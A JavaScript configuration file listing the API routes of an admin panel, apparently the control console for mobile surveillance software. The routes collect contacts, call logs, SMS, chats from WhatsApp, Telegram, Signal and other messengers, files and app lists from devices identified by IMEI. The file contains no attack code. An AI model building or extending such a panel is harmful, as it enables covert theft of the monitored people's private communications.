module.exports = () => ({
  url: process.env.REACT_APP_URL, //|| "http://194.156.88.235:3000",
  appIcon:"https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fbeeimg.com%2Fimages%2Fb89917152674.png&f=1&nofb=1",
  routes: {
   register: "/api/v0.0.1/auth/register",
    login: "/api/v0.0.1/auth/login",
    auth: "/api/v0.0.1/auth/auth",
    getIPInfo: "/api/v0.0.1/admin/getIPInfo",
    getDevices: "/api/v0.0.1/admin/getDevices",
    getDeviceInfo: "/api/v0.0.1/admin/getDeviceInfo",
    getContacts: "/api/v0.0.1/admin/getContacts",
    getCallLogs: "/api/v0.0.1/admin/getCallLogs",
    getSmsLogs: "/api/v0.0.1/admin/getSmsLogs",
    getWhatsapp: "/api/v0.0.1/admin/getWhatsapp",
    getWhatsappBusiness:"/api/v0.0.1/admin/getWhatsappBusiness",
    getTelegram:"/api/v0.0.1/admin/getTelegram",
    getSignal:"/api/v0.0.1/admin/getSignal",
    getMessanger:"/api/v0.0.1/admin/getMessanger",
    getViber:"/api/v0.0.1/admin/getViber",
    getConion:"/api/v0.0.1/admin/getConion",
    getImo:"/api/v0.0.1/admin/getImo",
    getProtectedText:"/api/v0.0.1/admin/getProtectedText",
    getFileListing: "/api/v0.0.1/admin/getFileListing",
    getFile: "/api/v0.0.1/admin/getFile",
    getFiles:"/api/v0.0.1/admin/getFiles",
    cancelFile: "/api/v0.0.1/admin/cancelFile",
    moveToTrash: "/api/v0.0.1/admin/moveToTrash",
    deletePermanently: "/api/v0.0.1/admin/deletePermanently",
    moveToInbox: "/api/v0.0.1/admin/moveToInbox",
    saveData: "/api/v0.0.1/admin/saveData",
    getZipFiles:"/getZipFiles",
    getInfo:"/api/v0.0.1/admin/getInfo",
    getUsers: "/api/v0.0.1/user/getUsers",
    getChats: "/api/v0.0.1/chats/getChats",
    saveChats: "/api/v0.0.1/chats/saveChats",
    getGroups: "/api/v0.0.1/user/getGroups",
    getFriends: "/api/v0.0.1/user/getFriends",
    getZipFile: "/getZipFiles",
    getStaticFile: "/getStaticFile",
    saveChatByIMEI: "/api/v0.0.1/chats/saveChatByIMEI",
    getApps:"/api/v0.0.1/admin/getApps",
    downloadFiles:"/api/v0.0.1/admin/downloadFiles"
  },
  requestConfig: {
    header: {
      "Content-Type": "application/json",
    },
  },
});
